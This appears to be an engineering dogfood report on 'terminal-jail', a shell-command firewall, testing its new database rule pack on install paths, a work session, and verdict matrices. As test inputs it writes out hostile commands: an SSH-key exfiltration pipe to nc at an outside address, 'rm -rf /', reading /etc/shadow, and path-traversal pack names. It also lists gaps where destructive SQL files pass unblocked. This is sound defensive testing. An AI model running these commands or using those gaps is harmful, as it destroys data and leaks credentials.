# terminal-jail — dogfood integration report, 2026-09-19

**Verdict: 🟡 PROMISING-BUT-ROUGH** (the shipped firewall and the base install
are solid; the *newest* feature — opt-in rule packs — ships two silent-failure
modes, one of which takes the whole install down on a fresh machine).

- **Promise tested:** *a fresh user can install from a checkout, opt into a niche
  rule pack (`./install.sh --rule-pack db`) to protect a database host, and get a
  firewall that blocks `DROP DATABASE` / `DROP TABLE` and sandboxes dump/restore
  tooling — with a precedence + collision contract that refuses a silent override
  at install time.*
- **Time-to-first-success:** <5 s on the dev box (install 0 s, first block
  immediate). On a **fresh machine** the pack path never reached success — the
  install aborted (see §2).
- **Friction: 11** (6 in-project, 5 install/ops).
- **Real use:** 15-command DB migration work session through the installed CLI,
  an 8-shape verdict matrix through the bridge, the `sed`/`git` remediation loop,
  the documented same-id override escape hatch, opt-out, and 4 installer error
  paths. Fresh-machine install leg on las-02 (ephemeral spawn unavailable — §6).

Canonical rows: `.coding-hermes/board/tasks.jsonl` → `DF-TERMINAL-JAIL-21..26`
(this file is the human-readable narrative).

---

## 1. What was dogfooded and why

The rule-pack system landed 6 hours before this run (`a33adf1`, TJ-GAP-061) and
had never been used by a user. Every other surface (egress, interruptor,
auto-sandbox, backends) has been covered by the 09-15..09-18 runs, so this run
spent its budget on the newest shippable feature plus the documented install
path a fresh user follows.

Environment: dev host (kernel 7.0.0-30, PyYAML present), scratch HOMEs under
`/tmp/dogfood-tj`, fresh box = `bunker-las-02` (Debian, python3.13.5, **no
PyYAML, no pip**), existing access only — no repo visibility or permission was
touched.

## 2. Install leg: `--rule-pack` aborts the entire install on a fresh machine

The strongest finding of the run. On the fresh box, following the README's
Rule-packs section verbatim:

```
$ env -i HOME=/tmp/tjhome3 PATH=/usr/local/bin:/usr/bin:/bin sh -c \
      'cd /tmp/tjapp && ./install.sh --rule-pack db'
rule-pack-tool: refused: /tmp/tjapp/plugin/terminal_jail/rules/packs/db.yaml:
    cannot parse (JSONDecodeError: Expecting value: line 1 column 1 (char 0))
terminal-jail installer: rule pack 'db' REFUSED — nothing was written
$ echo $?
2
$ ls /tmp/tjhome3/.local/bin/terminal-jail
ls: cannot access ...: No such file or directory        # NOTHING was installed
```

Cause, measured on the same box:

```
$ python3 -V                       -> Python 3.13.5
$ python3 -c "import yaml"         -> ModuleNotFoundError
$ python3 -m pip --version         -> /usr/bin/python3: No module named pip
```

The validator (`scripts/rule-pack-tool.py`) parses YAML with PyYAML and falls
back to `json` — a YAML file through `json.loads` is a guaranteed
`JSONDecodeError`. The docs say only *"installing a pack requires `python3`"*;
PyYAML is never mentioned, and a bare user cannot install it (no pip, `sudo`
needs a password). The refusal is correct fail-closed behaviour, but it is
**whole-install fatal**: `install.sh` runs `set -eu`, so the refusal ends the
script before anything is written.

Control on the same box, same checkout, no pack:

```
$ ./install.sh                     -> installed to /tmp/tjhome2/.local/bin/terminal-jail
$ terminal-jail --version          -> terminal-jail 1.1.0
$ terminal-jail chmod 777 /tmp/tjapp-x
  COMMAND BLOCKED — builtin-chmod-777-root        rc=126
```

So the base install is healthy on a fresh machine; only the pack flag breaks it.
The user-visible outcome is the worst kind: **the thing advertised as an extra
gets you nothing at all, with an error message that names neither the missing
dependency nor the remedy.**

## 3. A prefix install writes the pack where the engine never looks

Measured on the dev box with a scratch HOME, pack install, then the bridge:

```
$ TERMINAL_JAIL_INSTALL_DIR=/tmp/dogfood-tj/p2 ./install.sh --rule-pack db
terminal-jail installer: installed rule pack 'db' to
    /tmp/dogfood-tj/config/terminal-jail/rules.d/terminal-jail-pack-db.yaml
terminal-jail installer: WARNING — non-default install prefix; installing default
    rules to .../config/terminal-jail/rules.d. The engine loads
    /etc/terminal-jail/rules.d and ~/.config/terminal-jail/rules.d only; set
    TERMINAL_JAIL_RULES_DIR explicitly to target the live rules directory.
```

The pack line carries **no warning of its own**, and the warning that does print
is about the *default rules file*. What the engine actually reads
(`plugin/terminal_jail/interruptor/config.py` + `decider.py`):

| source | dir |
|---|---|
| system rules | `/etc/terminal-jail/rules.d` |
| user rules | `$HOME/.config/terminal-jail/rules.d` — or `TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR` |
| built-ins (54) | **Python**, `blocklist.py` / `allowlist.py` / `sandbox.py` — always loaded |

Consequence, measured by calling the bridge from the *installed* prefix tree:

```
  block    rule_id=builtin-rm-rf-root         | rm -rf /
  block    rule_id=builtin-sudo               | sudo cat /etc/shadow
  allow    rule_id=None                       | psql -c "DROP DATABASE prod"      <-- pack inert
  block    rule_id=builtin-net-file-exfil-pipe| cat ~/.ssh/id_rsa | nc 10.0.0.1 4444
```

The built-ins still fire, so the firewall looks perfectly healthy at run time —
`rm -rf /` is still blocked — while the pack the user just "installed" does
nothing and says nothing. The documented remedy is also half-true:
`TERMINAL_JAIL_RULES_DIR` (README §Install, quickstart:402, specs/cli.md:380) is
**installer-side only** and moves the file; the *engine-side* knob
`TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR` is documented nowhere outside
`specs/interruptor.md:573`. Setting the documented knob therefore reproduces the
same inert state.

## 4. Real work session (pack genuinely installed, default path)

15 commands a DB-touching developer runs, through the installed CLI:

| # | command | verdict |
|---|---|---|
| 1 | `mkdir -p build` | allowed |
| 2 | `git status --short` | allowed |
| 3 | `psql -c "SELECT count(*) FROM users"` | allowed (psql then failed: no such db) |
| 4 | `psql -c "DELETE FROM sessions WHERE expired_at < now()"` | allowed |
| 5 | `psql -c "DROP TABLE _scratch_import"` | **BLOCKED** `pack-db-drop-table` |
| 6 | `psql -f migrations/001_add_col.sql` | allowed |
| 7 | `pg_dump mydb` | **modify** → sandboxed (`pack-db-dump-restore`) |
| 8 | `grep -rn "DROP DATABASE" migrations/` | allowed (`allow-grep`) |
| 9 | `sed -i "s/DROP DATABASE/-- DROP DATABASE/" migrations/003_shard.sql` | **BLOCKED** |
| 10 | `git commit -am "park the DROP DATABASE migration"` | **BLOCKED** |
| 11 | `echo "DROP TABLE users" > build/rollback.sql` | allowed (`allow-echo`) |
| 12 | `psql -f migrations/003_shard.sql` | allowed (file DOES `DROP DATABASE`) |
| 13 | `psql -c "\! rm -rf /"` | **BLOCKED** |
| 14 | `pg_restore -d mydb build/dump.sql` | **modify** (sandboxed) |
| 15 | `psql -c "SELECT 1"` | allowed |

What holds up: the two headline blocks (`DROP DATABASE`, `DROP TABLE`), the
sandbox rewrites, the psql shell-escape block, and zero false positives on the
read side (`grep`/`cat`/`echo` of the same statement text were allowed).

## 5. The pack blocks the fix and permits the disease

Same rules, same dir, measured through the bridge:

| shape | verdict | rule |
|---|---|---|
| `psql -c "DROP TABLE users"` (destructive, inline) | **block** | `pack-db-drop-table` |
| `psql -f migrations/002_legacy.sql` (destructive via file) | **allow** | `null` |
| `sed -i "s/DROP DATABASE/-- DROP DATABASE/" file.sql` (removing it) | **block** | `pack-db-drop-database` |
| `git commit -am "park the DROP DATABASE migration"` (recording the fix) | **block** | `pack-db-drop-database` |
| `psql -c "SELECT msg FROM t WHERE msg = 'drop database retry'"` (read-only) | **block** | `pack-db-drop-database` |
| `echo "DROP TABLE users" > build/rollback.sql` (writing a destructive script) | **allow** | `allow-echo` |

The pattern rules match the statement shape *anywhere in the command string*
(documented as deliberate), but in a DB pack the result is that a user can be
blocked from editing, committing or querying the phrase while the file-execution
path that actually destroys the data (`psql -f`, redirect, script) sails through
— the file-body gap is the pre-existing `DF-TERMINAL-JAIL-10`. Remediation of the
pack's own target is the workflow that breaks, which is a strictly worse
cost/benefit than the two blocks it buys. *(DF-TERMINAL-JAIL-23 closed the
false-positive half of this: the shipped block rules now match execution
context only, so the sed/git/quoted-literal rows above no longer block; the
`psql -f` gap remains DF-TERMINAL-JAIL-10's. This dogfood record describes the
pre-fix pack.)*

## 6. Install leg on an ephemeral bunker: SKIPPED (fleet-wide)

`bunker spawn` failed on **both** hosts, so the isolated fresh-agent leg could
not run. Not silently passed — evidence:

```
bunker spawn --server bunker-las-03 -> deadline_exceeded   (3rd consecutive run)
bunker spawn --server bunker-las-02 -> deadline_exceeded   (worked 2026-09-18)
```

Root cause from `journalctl -u bunkerd` (new information — previous runs recorded
only `deadline_exceeded`):

- **las-03:** the rootless-docker install actually *succeeded* (dockerd 29.8.1
  running, `docker version` returned server info, `docker.service` enabled) but
  the spawn was cancelled at **45.4 s** and the result discarded
  (`install rootless docker ...: signal: killed`). The rollback `userdel` then
  failed too (`context canceled`).
- **las-02:** cancelled at **29.9 s** at `enable linger` — also `context canceled`
  on rollback. The box additionally logged `no host SSH public key found, agent
  will not accept host connections`.
- Every cancelled spawn leaks its user: **17** `bunker-*` users on las-03,
  **46** on las-02. My two half-spawns (`bunker-659255d5`, `bunker-83f632fc`) were
  killed and removed (`userdel -r`, `/home` + `/run/user` cleaned) — fleets
  drift upward run over run.

The client deadline (≈30-45 s observed) is shorter than the server-side install
(60-90 s per the skill's own notes), and the client cancel destroys in-flight
server work. Stand-in for the isolated leg: the documented install was run on
las-02 as a plain account in a scratch HOME (results in §2), which is a real
second machine but **not** an ephemeral agent — recorded as
`SKIPPED-install-bunker`.

## 7. Measurement hygiene — three false findings avoided

Worth recording because it will bite the next agent. The first three "bugs" this
run found were **my own instrumentation**:

1. A `sh -c "… '$J' …"` wrapper around a JSON payload containing single quotes
   re-parsed the payload, so the bridge received a mangled command. Re-run
   without a shell (`subprocess`), a suspected CLI-serialization firewall evasion
   showed **0/10 divergence**.
2. `export TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR=…` in an earlier step
   **persisted in the terminal session** and silently redirected later "default
   resolution" probes. That produced two phantom findings: "the same-id override
   is not honoured" and "the CLI blocks what the engine allows". With `env -u`
   both contracts hold exactly as documented:

```
  # override present: zz-local.yaml -> builtin-chmod-777-root action: warn
  $ terminal-jail chmod 777 /tmp/…     -> WARNING — would have blocked … (rc=0)
  # override absent
  $ terminal-jail chmod 777 /tmp/…     -> COMMAND BLOCKED … (rc=126)
```

3. `rc=2` from `psql -c …` was the *engine's* verdict in my matrix script — but
   psql is installed on this box and rc=2 was psql's own "database does not
   exist". Verdict labels must come from the block box / exit 126, never from a
   bare exit code.

Lesson: in a long-lived shell, probe "default" behaviour with `env -u <vars>`,
compare against a control, and never infer a firewall verdict from a process exit
code.

## 8. The right way to use rule packs today

Verified working path (this is what the skill's pitfalls now carry):

```bash
# 1. default install scope — the only scope where a pack is guaranteed live
./install.sh --rule-pack db                    # needs PyYAML on the machine

# 2. never needed for the default scope; required ONLY if you must relocate rules
export TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR="$HOME/.config/terminal-jail/rules.d"

# 3. prove the pack is live before trusting it (never assume the install said so)
echo '{"command":"psql -c \"DROP DATABASE prod\""}' \
  | python3 ~/.local/lib/terminal-jail/plugin/terminal_jail/interruptor_bridge.py
#   -> {"action":"block","rule_id":"pack-db-drop-database",…}   = live
#   -> {"action":"allow","rule_id":null,…}                       = INERT

# 4. escape hatch when the pack blocks a legitimate workflow
#    rules.d/zz-local.yaml: same id, action: warn  (sorts after the pack file)
```

Documented-and-verified in this run: `--list-rule-packs` (3 lines, exit 0),
`--unrule-pack db` (removes exactly
`terminal-jail-pack-db.yaml`, leaves `00-builtins.yaml` and user files
untouched), and the 4 installer refusals (`unknown pack`, `../evil`,
`db/../../etc`, `--bogus`) — all `exit 2`, one reason line on **stderr**, nothing
written. The collision/precedence contract behind the feature is sound; the
delivery of it to a fresh machine is what needs work.
